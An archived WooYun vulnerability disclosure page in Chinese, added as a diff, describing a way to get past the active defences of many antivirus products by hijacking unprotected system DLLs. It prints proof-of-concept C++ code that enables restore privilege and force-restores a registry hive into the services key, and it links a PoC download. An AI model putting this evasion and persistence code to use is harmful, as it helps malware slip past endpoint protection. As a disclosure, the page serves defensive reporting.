@@ -1,0 +1,231 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		一种绕过绝大多数杀毒软件的方法(卡巴斯基、360、百度、腾讯、瑞星、江民、AVG、nod32)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		一种绕过绝大多数杀毒软件的方法(卡巴斯基、360、百度、腾讯、瑞星、江民、AVG、nod32)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/n0bele">n0bele</a> 
+</li><li>提交时间：		2013-09-26 14:29</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-26：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-02：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-05：	细节向第三方安全合作伙伴开放<br/>
+									2013-10-12：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-10-22：	细节向普通白帽子公开<br/>
+									2013-11-11：	细节向实习白帽子公开<br/>
+									2013-12-25：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">受影响厂商:包括但不仅限于卡巴斯基、360、百度、腾讯、瑞星、江民、AVG、nod32</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">杀毒软件在主动防御的时候过于依赖WFP，漏防了系统自身的文件，导致了恶意程序可能通过感染系统dll染过主动防御执行任意操作.<br />
+<br />
+<br />
+<br />
+DllHijack POC代码:<br />
+<br />
+</p><pre><code>BOOL EnableDebugPriv(LPCTSTR lpName)<br />
+{<br />
+	BOOL bRet = FALSE;<br />
+	HANDLE hToken = NULL;<br />
+	TOKEN_PRIVILEGES tp;<br />
+	LUID luid;<br />
+<br />
+	do<br />
+	{<br />
+		if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&amp;hToken))<br />
+			break;<br />
+		if(!LookupPrivilegeValue(NULL,lpName,&amp;luid))<br />
+			break;<br />
+		tp.PrivilegeCount = 1;<br />
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;<br />
+		tp.Privileges[0].Luid = luid;<br />
+<br />
+		bRet = AdjustTokenPrivileges(hToken,0,&amp;tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL);<br />
+	}<br />
+	while(FALSE);<br />
+	<br />
+	if(hToken != NULL)<br />
+		CloseHandle(hToken);<br />
+<br />
+	return bRet;<br />
+}<br />
+<br />
+BOOL RestoreReg(HKEY hKey,LPCWSTR lpSubKey,TCHAR szFilePath[MAX_PATH])<br />
+{<br />
+	BOOL bRet = FALSE;<br />
+	HKEY hCur = NULL;<br />
+	do<br />
+	{<br />
+		if(!EnableDebugPriv(SE_RESTORE_NAME))<br />
+			break;<br />
+		if(RegOpenKeyEx(hKey,lpSubKey,NULL,KEY_ALL_ACCESS,&amp;hCur) != ERROR_SUCCESS &amp;&amp;<br />
+			RegCreateKey(hKey,lpSubKey,&amp;hCur) != ERROR_SUCCESS)<br />
+			break;<br />
+		if(RegRestoreKey(hCur,szFilePath,REG_FORCE_RESTORE) != ERROR_SUCCESS)<br />
+			bRet = TRUE;<br />
+	}<br />
+	while(FALSE);<br />
+<br />
+	if(hCur)<br />
+		RegCloseKey(hCur);<br />
+<br />
+	return bRet;<br />
+}<br />
+<br />
+BOOL CDllHijackApp::InitInstance()<br />
+{<br />
+	CWinApp::InitInstance();<br />
+<br />
+	RestoreReg(HKEY_LOCAL_MACHINE,L&quot;SYSTEM\\CurrentControlSet\\Services\\poc&quot;,L&quot;C:\\poc.hiv&quot;);<br />
+<br />
+	return TRUE;<br />
+}</code></pre><p class='detail'><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">poc下载地址http://pan.baidu.com/s/1uuF8Z </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">辅助WFP防护，校验文件 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/n0bele" title="n0bele">n0bele</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-038250" title="一种绕过绝大多数杀毒软件的方法(卡巴斯基、360、百度、腾讯、瑞星、江民、AVG、nod32)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-10-02 00:27</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并在多个软件实例上复现所述情况，对于绕过查杀思路原理上进行认定。后续评估情况待补充，国庆后将更新后续跟进分析及评估。<br />
+<br />
+rank 15</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="38250";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
